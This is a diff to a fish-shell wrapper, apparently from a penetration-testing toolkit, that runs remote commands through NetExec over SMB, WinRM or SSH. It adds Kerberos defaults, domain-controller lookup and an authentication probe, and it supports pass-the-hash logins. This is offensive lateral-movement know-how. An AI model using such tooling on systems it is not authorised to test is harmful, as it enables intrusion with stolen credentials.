@@ -21,7 +21,7 @@ Options:
   -H, --hash <hash>         NTLM hash for pass-the-hash
   -d, --domain <domain>     Domain for authentication
   -k, --kerberos            Use Kerberos authentication
-  -x, --protocol <proto>    Protocol to use (smb/winrm/ssh, default: winrm)
+  -x, --protocol <proto>    Protocol (smb/winrm/ssh; default: smb with -k, winrm otherwise)
   -h, --help                Show this help message
 
 Examples:
@@ -42,10 +42,17 @@ Examples:
     end
     
     set -l target $_flag_target
+    set -l dc_ip (ezpz_dc_ip $target)
+    test -n "$dc_ip"; or set dc_ip $target
+    set -l dc_fqdn (ezpz_dc_fqdn $target)
+    test -n "$dc_fqdn"; or set dc_fqdn $target
+
     set -l protocol winrm
-    
     if set -q _flag_protocol
         set protocol $_flag_protocol
+    else if set -q _flag_kerberos
+        set protocol smb
+        ezpz_info "Kerberos selected; defaulting to SMB (use -x winrm to force WinRM)."
     end
     
     if not contains $protocol smb winrm ssh
@@ -88,6 +95,22 @@ Examples:
     if set -q _flag_domain
         set -a auth_args -d $_flag_domain
     end
+
+    set -l nxc_target $target
+    if set -q _flag_kerberos; and test -n "$dc_fqdn"
+        set nxc_target $dc_fqdn
+    end
+
+    if set -q _flag_kerberos
+        ezpz_kerberos_check $protocol; or return 1
+        set -l auth_probe (nxc $protocol $nxc_target $auth_args 2>&1)
+        if not string match -qr '\[\+\]' -- $auth_probe
+            ezpz_error "Kerberos authentication failed for $nxc_target ($protocol)."
+            printf '%s\n' $auth_probe | grep -aE '\[-\]|ERROR|error' | tail -5
+            ezpz_warn "If the ccache only has a CIFS service ticket, use -x smb or get a TGT."
+            return 1
+        end
+    end
     
     set -l user $_flag_username
     if string match -q "*\\*" $user
@@ -104,12 +127,12 @@ Examples:
             set command "cat ~/*.txt"
     end
     
-    ezpz_cmd "nxc $protocol $target $auth_args -x '$command'"
+    ezpz_cmd "nxc $protocol $nxc_target $auth_args -x '$command'"
     
     if not command -v nxc >/dev/null 2>&1
         ezpz_error "NetExec (nxc) not found in PATH"
         return 1
     end
     
-    nxc $protocol $target $auth_args -x $command 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
+    nxc $protocol $nxc_target $auth_args -x $command 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
 end
